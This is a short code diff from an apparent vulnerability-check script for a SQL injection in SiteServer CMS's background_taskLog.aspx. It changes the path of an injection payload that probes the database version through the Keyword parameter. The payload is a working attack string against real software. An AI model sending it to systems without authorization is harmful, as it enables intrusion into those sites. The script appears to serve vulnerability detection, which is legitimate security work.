@@ -19,7 +19,7 @@ class siteserver_background_taskLog_sqli_BaseVerify:
         headers = {
             "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
         }
-        payload = "/siteserver/service/background_taskLog.aspx?Keyword=test%%27AnD%20@@VeRsIon=1%20AnD%202='1&DateFrom=&DateTo=&IsSuccess=All"
+        payload = "/service/background_taskLog.aspx?Keyword=test%%27AnD%20@@VeRsIon=1%20AnD%202='1&DateFrom=&DateTo=&IsSuccess=All"
         vulnurl = self.url + payload
         try:
             req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
